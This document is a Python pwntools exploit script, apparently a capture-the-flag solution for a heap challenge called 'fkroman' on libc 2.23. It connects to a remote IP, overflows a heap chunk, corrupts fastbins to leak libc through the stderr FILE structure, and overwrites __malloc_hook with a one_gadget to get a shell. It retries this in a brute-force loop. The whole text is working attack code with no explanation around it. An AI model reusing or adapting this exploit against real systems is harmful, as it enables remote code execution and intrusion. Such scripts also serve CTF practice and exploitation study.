from pwn import *
context(arch='amd64',os='linux',log_level='debug')
elf = ELF('./fkroman')
libc = ELF('./libc-2.23.so')
#io = process('./fkroman')
io = 0

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
r = lambda :io.recv()

def add(idx, size):
    sl('1')
    ru('Index: ')
    sl(str(idx))
    ru('Size: ')
    sl(str(size))

def add1(idx, size):
    ru('Your choice: ')
    sl('1')
    #ru('Index: ')
    sl(str(idx))
    #ru('Size: ')
    sl(str(size))

def edit(idx, size, cont):
    ru('Your choice: ')
    sl('4')
    ru('Index: ')
    sl(str(idx))
    ru('Size: ')
    sl(str(size))
    ru('Content: ')
    sl(cont)

def edit1(idx, size, cont):
    ru('Your choice: ')
    sl('4')
    ru('Index: ')
    sl(str(idx))
    ru('Size: ')
    sl(str(size))
    ru('Content: ')
    s(cont)

def free(idx):
    ru('Your choice: ')
    sl('3')
    ru('Index: ')
    sl(str(idx))

def main():
    global io
    io = remote('121.40.246.48', 9999)
    #io = process('./fkroman', env = {"LD_PRELOAD":"./a.so"})
    sleep(5)
    add(0, 0x60)
    add(1, 0x90)
    add(2, 0x80)
    add(3, 0x60)
    add(4, 0x10)
    free(2)
    edit1(1,0xa+0x98, '/bin/sh\x00' + 'a'*0x88 + p64(0) + p64(0x71) + '\xdd\x25')
    free(3)
    free(0)
    edit1(0, 1, '\x10')
    add(5, 0x60)
    add(6, 0x60)
    add(7, 0x60)
    payload = 'a'*3 + 'a'*0x30 + p64(0xfbad1800) + p64(0)*3 + '\x00'
    edit1(7, len(payload), payload)
    rn(0x40)
    leak = u64(rn(8))
    log.success("leak: "+hex(leak))
    libc_base = leak - 192 - libc.sym['_IO_2_1_stderr_']
    libc.address = libc_base
    log.success('libc_base: '+hex(libc.address))
    _free_hook = libc.sym['__free_hook']
    _malloc_hook = libc.sym['__malloc_hook']
    log.success('malloc hook: '+hex(_malloc_hook))
    r()
    raw_input()
    add(14, 0x60)
    add(15, 0x60)
    add(8, 0x60)
    add(9, 0x60)
    free(8)
    free(9)
    edit1(9, 8, p64(_malloc_hook - 0x23))
    sleep(1)
    r()
    sl('')
    sl('')
    r()
    print '--------------------------'
    add(10, 0x60)
    sleep(1)
    print '--------------------------'
    add(11, 0x60)
    sys = libc.sym['system']
    one_gadget = libc.address + 0x4526a #0x45216 0x4526a 0xf02a4 0xf1147
    
    edit1(11, 0x1b, '\x00'*0x13 + p64(one_gadget))
    print '--------------------------'
    add(0x10, 0x10)
    io.interactive()

if __name__ == '__main__':
    for i in range(32):
        try:
            main()
        except:
            io.close()
            libc.address = 0
            print i